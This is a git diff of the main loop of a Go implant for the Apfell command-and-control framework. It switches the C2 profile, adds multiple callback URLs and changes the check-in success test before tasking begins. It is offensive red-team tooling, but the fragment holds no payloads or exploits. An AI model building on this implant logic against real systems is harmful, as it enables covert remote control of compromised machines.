@@ -38,12 +38,13 @@ func main() {
 	currIP := functions.GetCurrentIPAddress()
 	currPid := os.Getpid()
 	// Modify the profile used by changing this line
-	profile := profiles.C2Patchthrough{}
-	// profile := profiles.C2Default{}
+	// profile := profiles.C2Patchthrough{}
+	profile := profiles.C2Default{}
 	// profile := profiles.C2Slack{}
 	// profile := profiles.C2Websocket{}
 	profile.SetUniqueID(profiles.UUID)
 	profile.SetURL(profiles.BaseURL)
+	profile.SetURLs(profiles.BaseURLs)
 	profile.SetSleepInterval(profiles.Sleep)
 	profile.SetUserAgent(profiles.UserAgent)
 	// Evaluate static variables
@@ -65,8 +66,8 @@ func main() {
 
 	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
 	resp := profile.CheckIn(currIP, currPid, currentUser.Name, hostname)
-
 	checkIn := resp.(structs.CheckinResponse)
+	//log.Printf("Received checkin response: %+v\n", checkIn)
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
@@ -93,7 +94,7 @@ func main() {
 	// Channel used to catch results from tasking threads
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
-	if checkIn.Active {
+	if strings.Contains(checkIn.Status, "success") {
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
 
